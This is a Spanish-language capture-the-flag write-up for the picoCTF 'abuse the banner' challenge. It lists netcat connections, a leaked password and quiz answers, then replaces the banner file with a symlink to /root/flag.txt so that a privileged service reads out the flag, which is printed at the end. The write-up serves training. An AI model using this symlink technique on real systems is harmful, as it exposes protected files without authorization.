## Descripción 
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 53928`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 60285`. From the above information abuse the machine and find the flag in the /root directory.
## Solución
Ingresar el comando "nc tethys.picoctf.net 53928" para ver la password.

Ingresar el comando "nc tethys.picoctf.net 60285" para empezar la conexion.
Responder las siguientes preguntas:
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

Una vez pasadas las preguntas insertar los siguientes comandos para eliminar el banner.

rm /home/player/banner

 ln -s /root/flag.txt /home/player/banner

salirse de la conexión.
volver a hacer la conexión para tener la flag.
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

## Notas Adicionales 
## Referencias
